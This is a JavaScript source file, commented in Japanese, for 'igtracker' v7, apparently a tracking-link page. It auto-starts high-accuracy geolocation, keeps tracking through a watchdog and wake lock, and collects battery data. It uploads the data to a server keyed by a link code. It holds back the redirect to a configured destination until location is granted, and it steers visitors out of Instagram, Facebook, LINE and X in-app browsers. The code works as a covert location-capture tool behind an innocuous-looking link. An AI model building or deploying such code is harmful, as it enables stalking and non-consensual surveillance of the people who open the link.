/* 連続位置追跡クライアント (igtracker) v7
   window.LT_CODE / LT_IV / LT_MAX / LT_HIT を事前定義すること。
   ・ユーザー操作なしで自動開始し、開いている間ずっと取り続ける
   ・測位が途切れたらウォッチドッグが自動復帰
   ・取得できるまでリダイレクトしない（未許可時は「もう一度」だけ出す）
   ・一度でも取得できたら ok を固定し、あとから未取得扱いに戻らない */
(function () {
  "use strict";

  var CODE = window.LT_CODE || "";
  if (!CODE) return;

  var API  = "/l/" + encodeURIComponent(CODE) + "/p";
  var IV   = Math.max(5, (window.LT_IV || 15) | 0) * 1000;
  var MAXMIN = (window.LT_MAX || 180) | 0;
  var HIT  = window.LT_HIT || 0;
  var SEND_EVERY = Math.min(IV, 4000);
  var GEO_OPTS = { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 };

  var DEST = window.LT_DEST || "";
  var DEST_MIN = (parseFloat(window.LT_DEST_MIN) || 2) * 1000;
  var WAIT = (parseFloat(window.LT_WAIT) || 10) * 1000;
  var DENY_REDIRECT = !!window.LT_DENY_REDIRECT;
  var BRIEF = !!window.LT_BRIEF;
  var TXT = {
    ask:  window.LT_ASK_TEXT  || "位置情報の使用を許可してください",
    ok:   window.LT_OK_TEXT   || "取得しました。移動します…",
    deny: window.LT_DENY_TEXT || "位置情報が許可されていません"
  };

  var SID = (function () {
    try {
      var v = sessionStorage.getItem("igt_sid_" + CODE);
      if (!v) {
        v = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
        sessionStorage.setItem("igt_sid_" + CODE, v);
      }
      return v;
    } catch (e) { return Math.random().toString(36).slice(2, 12); }
  })();

  var q = [];
  var sending = false, last = 0, started = 0, count = 0, left = false;
  var wid = null, wake = null, clock = null, sender = null, dog = null;
  var waitTimer = null;
  var stopped = true, gotFix = false, bestAcc = null;
  var lastFix = 0, lastAsk = 0, lastRestart = 0, denied = false;
  var state = "wait";           // wait | ok | deny
  var batt = null, chg = null;

  function $(id) { return document.getElementById(id); }
  function setTxt(id, v) { var e = $(id); if (e) e.textContent = v; }
  function iso(t) { try { return new Date(t).toISOString(); } catch (e) { return ""; } }

  function say(m, c) {
    var s = $("lt_st");
    if (!s) return;
    if (BRIEF) {
      var cls = state === "deny" ? "warn" : (state === "ok" ? "on" : "dim");
      s.className = "ask-t lt-" + cls;
      s.textContent = state === "deny" ? TXT.deny : (state === "ok" ? TXT.ok : TXT.ask);
      return;
    }
    if (state === "deny" && !m) { s.textContent = TXT.deny; s.className = "lt-warn"; return; }
    s.textContent = m || TXT.ask;
    s.className = "lt-" + (c || "dim");
  }

  function showBtns() {
    var r = $("lt_retry");
    if (r) r.style.display = state === "deny" ? "" : "none";
  }

  function setState(st) {
    state = st;
    say("", st === "deny" ? "warn" : (st === "ok" ? "on" : "dim"));
    showBtns();
  }

  /* 「未取得のまま待ちすぎ」のタイマー。取得済みなら何もしない。 */
  function armWait(ms) {
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (gotFix || left || stopped) return;
    waitTimer = setTimeout(function () {
      waitTimer = null;
      if (left || stopped || gotFix) return;
      if (DENY_REDIRECT && DEST) { leave(); return; }
      setState("deny");
    }, ms);
  }

  function tick() {
    if (!started || BRIEF) return;
    var sec = Math.floor((Date.now() - started) / 1000);
    setTxt("lt_time", ("0" + Math.floor(sec / 60)).slice(-2) + ":" +
                      ("0" + (sec % 60)).slice(-2));
  }

  function drop(arr) { q = q.filter(function (x) { return arr.indexOf(x) === -1; }); }

  function send(extra) {
    if (sending) return;
    if (!q.length && !extra) return;
    sending = true;
    var pts = q.slice(0);
    var body = { sid: SID, kind: (extra && extra.kind) || "pt", hit: HIT, pts: pts };
    fetch(API, {
      method: "POST", cache: "no-store", keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    })
      .then(function (r) { return r.json().catch(function () { return {}; }); })
      .then(function (j) {
        drop(pts);
        last = Date.now();
        if (j && j.iv && j.iv * 1000 !== IV) IV = j.iv * 1000;
      })
      .catch(function () {})
      .then(function () { sending = false; });
  }

  function beacon(kind) {
    var pts = q.slice(0);
    var payload = JSON.stringify({ sid: SID, kind: kind, hit: HIT, pts: pts });
    var ok = false;
    try {
      ok = !!(navigator.sendBeacon && navigator.sendBeacon(
        API, new Blob([payload], { type: "application/json" })));
    } catch (e) { ok = false; }
    if (ok) drop(pts);
    else send({ kind: kind });
  }

  function goto(url) {
    if (!url || left) return;
    left = true;
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    try { beacon("stop"); } catch (e) {}
    try { location.replace(url); }
    catch (e) { location.href = url; }
  }

  function leave() { if (!left && DEST) goto(DEST); }

  function onPos(p) {
    var c = (p && p.coords) || {};
    if (c.latitude == null || c.longitude == null) return;
    var firstFix = !gotFix;
    gotFix = true; denied = false; count++;
    lastFix = Date.now();
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (firstFix) setState("ok");
    q.push({ ts: iso(p.timestamp || Date.now()), lat: c.latitude, lon: c.longitude,
             acc: c.accuracy, spd: c.speed, hdg: c.heading, batt: batt, chg: chg });
    if (q.length > 3000) q.splice(0, q.length - 3000);
    if (c.accuracy && (bestAcc === null || c.accuracy < bestAcc)) bestAcc = c.accuracy;
    setTxt("lt_now", c.latitude.toFixed(5) + ", " + c.longitude.toFixed(5) +
                    (c.accuracy ? " ±" + Math.round(c.accuracy) + "m" : ""));
    say("記録中 " + count + " 点" +
        (bestAcc ? "（最高精度 ±" + Math.round(bestAcc) + "m）" : ""), "on");
    if (count === 1 || q.length >= 4 || Date.now() - last > SEND_EVERY) send();
    if (firstFix && DEST) setTimeout(leave, DEST_MIN);
  }

  function onErr(e) {
    var c = e && e.code;
    if (c === 1) {                       // 明示的に拒否
      denied = true;
      if (!gotFix) setState("deny");
      else say("位置情報が拒否されています", "warn");
      return;
    }
    if (c === 2) {                       // 取得不可（アプリ内ブラウザ等）
      if (!gotFix) setState("deny");
      else say("位置を取得できません", "warn");
      return;
    }
    // c === 3 (タイムアウト) など → 取得済みなら触らない、未取得ならもう少し待つ
    if (gotFix) say("測位がタイムアウト。自動で再試行します", "warn");
    else armWait(WAIT);
  }

  function watchdog() {
    if (stopped || left || !navigator.geolocation) return;
    var gap = Date.now() - (lastFix || started || Date.now());
    var need = (denied || state === "deny") ? 8000 : 15000;
    if (gap > need && Date.now() - lastAsk > 6000) {
      lastAsk = Date.now();
      try { navigator.geolocation.getCurrentPosition(onPos, onErr, GEO_OPTS); } catch (e) {}
    }
    if (gap > 45000 && Date.now() - lastRestart > 30000) {
      lastRestart = Date.now();
      restart();
    }
  }

  function showPerm() {
    var el = $("lt_perm");
    if (!el) return Promise.resolve("unknown");
    if (!navigator.permissions || !navigator.permissions.query) {
      el.textContent = "unknown"; el.className = "lt-dim";
      return Promise.resolve("unknown");
    }
    return navigator.permissions.query({ name: "geolocation" })
      .then(function (p) {
        el.textContent = p.state;
        el.className = p.state === "granted" ? "lt-on"
          : (p.state === "denied" ? "lt-warn" : "lt-dim");
        p.onchange = function () { showPerm(); };
        return p.state;
      })
      .catch(function () { el.textContent = "unknown"; el.className = "lt-dim"; return "unknown"; });
  }

  function checkInApp() {
    var ua = navigator.userAgent || "";
    var name = "";
    if (/Instagram/i.test(ua)) name = "Instagram";
    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
    else if (/Line\//i.test(ua)) name = "LINE";
    else if (/Twitter/i.test(ua)) name = "X";
    if (!name) return;
    var box = $("lt_ia"), nm = $("lt_ia_name"), link = $("lt_safari");
    if (box) box.style.display = "block";
    if (nm) nm.textContent = name;
    if (link) {
      var ios = /iPhone|iPad|iPod/i.test(ua);
      link.href = ios ? location.href.replace(/^https:/, "x-safari-https:")
        : "intent://" + location.href.replace(/^https?:\/\//, "") +
          "#Intent;scheme=https;package=com.android.chrome;end";
    }
  }

  function ask() {
    return new Promise(function (res) {
      if (!navigator.geolocation) return res(false);
      navigator.geolocation.getCurrentPosition(
        function (p) { onPos(p); res(true); },
        function (e) { onErr(e); res(false); }, GEO_OPTS);
    });
  }

  /* 測位を1回投げて、結果が出てから「待ちすぎ」タイマーを張る */
  function attempt() {
    if (stopped || left) return Promise.resolve(false);
    lastFix = 0; lastAsk = 0;
    restart();
    return ask().then(function () {
      if (stopped || left) return false;
      start();
      if (!gotFix) armWait(WAIT);
      return gotFix;
    });
  }

  function readBatt() {
    try {
      if (!navigator.getBattery) return;
      navigator.getBattery().then(function (b) {
        function up() { batt = b.level; chg = b.charging ? 1 : 0; }
        up();
        b.addEventListener("levelchange", up);
        b.addEventListener("chargingchange", up);
      }).catch(function () {});
    } catch (e) {}
  }

  function keepAwake() {
    try {
      if (navigator.wakeLock && !wake) {
        navigator.wakeLock.request("screen").then(function (w) {
          wake = w;
          w.addEventListener("release", function () { wake = null; });
        }).catch(function () {});
      }
    } catch (e) {}
  }

  function start() {
    if (wid !== null || !navigator.geolocation) return;
    try {
      wid = navigator.geolocation.watchPosition(onPos, onErr,
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
    } catch (e) { wid = null; }
  }

  function restart() {
    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
    start();
  }

  function boot() {
    if (started) return;
    started = Date.now(); stopped = false;
    showPerm(); checkInApp(); readBatt(); keepAwake(); showBtns();
    if (!navigator.geolocation) { setState("deny"); return; }
    ask().then(function () {
      if (stopped || left) return;
      start();
      if (!gotFix) q.push({ ts: iso(Date.now()) });   // 取得できていなければIP地点を1点だけ
      send({ kind: "open" });
      clock = setInterval(tick, 1000);
      sender = setInterval(function () {
        tick();
        if (q.length) send();
        else if (Date.now() - last > Math.max(30000, IV * 3)) send({ kind: "hb" });
        if (MAXMIN && Date.now() - started > MAXMIN * 60000) stop("時間上限");
      }, SEND_EVERY);
      dog = setInterval(watchdog, 5000);
      say("記録を開始しました（自動・永続）", "on");
      if (!gotFix) armWait(WAIT);
    });
  }

  function stop(why) {
    if (stopped) return;
    stopped = true; started = 0;
    if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
    if (wid !== null) { try { navigator.geolocation.clearWatch(wid); } catch (e) {} wid = null; }
    if (clock) clearInterval(clock);
    if (sender) clearInterval(sender);
    if (dog) clearInterval(dog);
    clock = sender = dog = null;
    beacon("stop");
    state = "wait";
    say("停止しました" + (why ? "（" + why + "）" : "") + " 記録 " + count + " 点", "dim");
    showBtns();
  }

  function resume() {
    if (stopped || left) return;
    keepAwake();
    lastRestart = 0;
    watchdog();
    if (!gotFix) attempt();
    send({ kind: "hb" });
  }

  document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") { if (!left) beacon("hb"); return; }
    resume();
  });
  window.addEventListener("focus", resume);
  window.addEventListener("online", resume);
  window.addEventListener("pagehide", function () { if (!left) beacon("stop"); });
  window.addEventListener("pageshow", function (e) {
    if (!e.persisted) return;
    stopped = false; left = false;
    if (!started) started = Date.now();
    lastFix = 0; lastRestart = 0;
    restart();
    send({ kind: "open" });
    if (!gotFix) armWait(WAIT);
  });

  // ボタン以外の場所タップでも測位を促す
  document.addEventListener("click", function (e) {
    var t = e.target;
    if (t && t.tagName === "BUTTON") return;
    if (!stopped && !gotFix) attempt();
  }, { passive: true });

  var go = $("lt_go"), sp = $("lt_stop"), cp = $("lt_copy"), rt = $("lt_retry");
  if (go) go.addEventListener("click", function () {
    if (stopped) { boot(); go.textContent = "再取得"; }
    else attempt();
  });
  if (rt) rt.addEventListener("click", function () {
    setState("wait");
    attempt();
  });
  if (sp) sp.addEventListener("click", function () { stop("手動"); });
  if (cp) cp.addEventListener("click", function () {
    try { navigator.clipboard.writeText(location.href); } catch (e) {}
    cp.textContent = "コピーしました";
  });

  window.LT_LIVE = { start: boot, stop: stop, leave: leave, retry: attempt, sid: SID };

  showPerm().then(function () { checkInApp(); boot(); });
})();